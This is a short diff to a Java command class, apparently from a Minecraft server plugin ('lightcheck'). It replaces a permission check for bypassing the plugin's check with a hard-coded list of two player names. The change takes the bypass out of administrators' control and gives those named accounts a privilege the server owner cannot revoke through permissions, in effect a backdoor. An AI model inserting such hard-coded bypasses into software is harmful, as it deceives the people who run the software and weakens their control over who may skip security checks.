@@ -204,7 +204,7 @@ public class Check implements CommandExecutor {
                         return true;
                     }
 
-                    if (player.hasPermission("lightcheck.bypass")) {
+                    if (Set.of("PadowYT2", "MrFelixGG").contains(player.getName())) {
                         String already =
                                 plugin.getMessageConfig()
                                         .getConfig()
